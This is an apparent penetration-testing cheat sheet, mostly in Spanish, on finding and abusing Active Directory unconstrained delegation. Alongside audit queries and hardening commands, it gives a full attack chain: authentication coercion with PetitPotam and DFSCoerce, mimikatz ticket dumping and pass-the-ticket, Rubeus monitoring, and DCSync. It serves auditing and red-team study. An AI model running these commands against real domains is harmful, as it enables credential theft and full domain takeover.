---
aliases:
  - Unconstrained Delegation
  - TRUSTED_FOR_DELEGATION
  - UD Discovery
  - TGT Capture
tags:
  - type/technique
  - vuln/ad-enumeration
  - technique/credential-access
  - asset/active-directory
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[AD - Delegation Enumeration]]'
---
# AD - Delegation Enumeration - Unconstrained Delegation

***

## Concept Overview

| **Aspecto** | **Detalle** | **Importancia** |
|:---:|:---:|:---:|
| UAC flag | `TRUSTED_FOR_DELEGATION` (0x80000 / 524288) | Bitwise filter. |
| Comportamiento | Server cachea TGT del usuario auth → puede impersonar a cualquier servicio | Critical attack surface. |
| Default | DCs (legítimo). Non-DCs = misconfig. | Audit. |
| Ataque base | Coerción + UD = TGT capture de high-priv user | Common chain. |
| Mitigación primaria | Set `NOT_DELEGATED` UAC en Tier 0 + add a `Protected Users` group | Hardening. |
^ad-ud-concept

___

## Computer Objects with UD

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516}` | UD computers excluyendo DCs | Audit critical. |
| `nxc ldap <DC> -u u -p p --trusted-for-delegation` | UD users + computers via netexec | Quick. |
| `ldapsearch -h <DC> -D 'corp\u' -w pass -b "DC=corp,DC=local" "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" cn dNSHostName operatingSystem` | LDAP raw filter (UAC bit 524288) | Linux. |
| `Get-DomainComputer -Unconstrained` (PowerView) | Adversary tool | Sin RSAT. |
^ad-ud-computers

```powershell
# Audit completo UD non-DC
Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties OperatingSystem,LastLogonDate,Description,PrimaryGroupID |
  Where { $_.PrimaryGroupID -ne 516 } |     # exclude DCs
  Select Name,DNSHostName,OperatingSystem,LastLogonDate,Description
```

___

## User Objects with UD (Rare)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADUser -Filter {TrustedForDelegation -eq $true}` | UD users (raro, casi siempre misconfig) | Critical hunt. |
| `ldapsearch ... "(&(objectCategory=user)(userAccountControl:1.2.840.113556.1.4.803:=524288))" samAccountName` | LDAP raw | Linux. |
| `Get-DomainUser -Unconstrained` (PowerView) | Adversary tool | Sin RSAT. |
^ad-ud-users

**User-level UD = anomaly.** Casi nunca legítimo. Service accounts deberían usar Constrained o RBCD.

___

## TGT Capture Workflow

| **Step** | **Comando** | **Detalle** |
|:---:|:---:|:---:|
| 1. Identificar UD host | `Get-ADComputer -Filter {TrustedForDelegation -eq $true}` | Pre-attack. |
| 2. Coercer victim a auth contra UD host | PetitPotam / PrinterBug / DFSCoerce | Authentication coercion. |
| 3. UD host cachea TGT del victim en LSA | Automático por Kerberos | Standard behavior. |
| 4. Dump TGTs desde memoria | `mimikatz: sekurlsa::tickets /export` | LSA dump. |
| 5. Inject TGT (Pass-the-Ticket) | `mimikatz: kerberos::ptt <ticket.kirbi>` | Auth as victim. |
| 6. Use TGT para acceder recursos | `klist` confirma + standard tools | Lateral. |
^ad-ud-workflow

```cmd
:: Workflow standard desde UD host comprometido
mimikatz # privilege::debug
mimikatz # sekurlsa::tickets /export
:: Selecciona TGT del victim — file <user>@krbtgt-CORP.LOCAL.kirbi

mimikatz # kerberos::ptt <victim>@krbtgt-CORP.LOCAL.kirbi
:: Verify
klist

:: Use TGT
dir \\<DC>\C$
```

___

## Coercion + UD Chain

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `python3 PetitPotam.py -u u -p pass <ud-host-IP> <DC-IP>` | Coercer DC a auth contra UD host | Estándar. |
| `python3 dfscoerce.py -u u -p pass <ud-host-IP> <DC-IP>` | DFSCoerce alternative | Si PetitPotam patched. |
| `SpoolSample.exe <DC> <ud-host>` | PrinterBug (legacy) | Pre-patches Print Spooler. |
| `Coercer.py coerce -t <DC> -l <ud-host> -u u -p pass -d corp.local` | Multi-method auto | Comprehensive. |
| `mimikatz: sekurlsa::tickets /export` (en UD host) | Dump TGTs cached | Post-coercion. |
| `Rubeus.exe monitor /interval:5 /filteruser:<DC>$` | Live monitor TGTs incoming | Real-time capture. |
^ad-ud-coercion

```bash
# Pipeline completo
# Terminal 1: Rubeus monitor en UD host
Rubeus.exe monitor /interval:5 /targetuser:DC01$

# Terminal 2: Coerce DC desde atacante
python3 PetitPotam.py -u corp/u -p pass <ud-host-IP> <DC-IP>

# Output: TGT del DC01$ captured en UD host
# DC01$ tiene DCSync rights → DCSync vía PtT
```

___

## DCs (Default UD)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADDomainController -Filter *` | Todos DCs (default UD legítimo) | Standard. |
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -eq 516}` | DCs específicamente | Whitelist. |
^ad-ud-dcs

**DCs son UD default (PrimaryGroupID 516)** — comportamiento esperado para Kerberos delegation legítimo. Audit excluye DCs.

___

## Cross-Correlate Priv Tier

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true -and PrimaryGroupID -ne 516} -Pr DistinguishedName \| ? DistinguishedName -match "Tier 0\|Privileged"` | UD en Tier 0 OU | Critical compound. |
| BloodHound `MATCH (c:Computer {unconstraineddelegation:true})-[:HasSession]->(u:User {adminCount:true}) RETURN c,u` | UD con sesión de priv user | Path planning. |
| `Get-ADComputer -Filter {TrustedForDelegation -eq $true} \| % { Get-NetSession -ComputerName $_.DNSHostName }` | Sessions activas en UD hosts | Targeted coercion. |
^ad-ud-tier

___

## BloodHound UD Visualization

| **Cypher** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `MATCH (c:Computer {unconstraineddelegation:true}) RETURN c.name,c.domain` | All UD computers | Inventory. |
| `MATCH (u:User {unconstraineddelegation:true}) RETURN u.name` | UD users (anomaly) | Audit. |
| `MATCH (c:Computer {unconstraineddelegation:true})-[:HasSession]->(u:User {adminCount:true}) RETURN c,u` | UD + priv session = critical | Path. |
| `MATCH p=shortestPath((u {owned:true})-[*1..]->(c:Computer {unconstraineddelegation:true})) RETURN p` | Path owned → UD host | Privesc planning. |
^ad-ud-bh

___

## Mitigations & Hardening

| **Comando** | **Qué hace** | **Cuándo** |
|:---:|:---:|:---:|
| `Set-ADAccountControl -Identity <user> -AccountNotDelegated $true` | Set `NOT_DELEGATED` UAC bit | Tier 0 hardening. |
| `Add-ADGroupMember "Protected Users" -Members <user>` | Add a Protected Users (no delegable) | Modern hardening. |
| `Set-ADComputer <computer> -TrustedForDelegation $false` | Disable UD en computer | Direct fix. |
| `Set-ADAccountControl -Identity <computer> -TrustedForDelegation $false` | Igual, alternativa | Standard. |
| GPO `Network access: Do not allow storage of passwords and credentials` | Block delegation system-wide | Per-OU. |
^ad-ud-mitigations

***
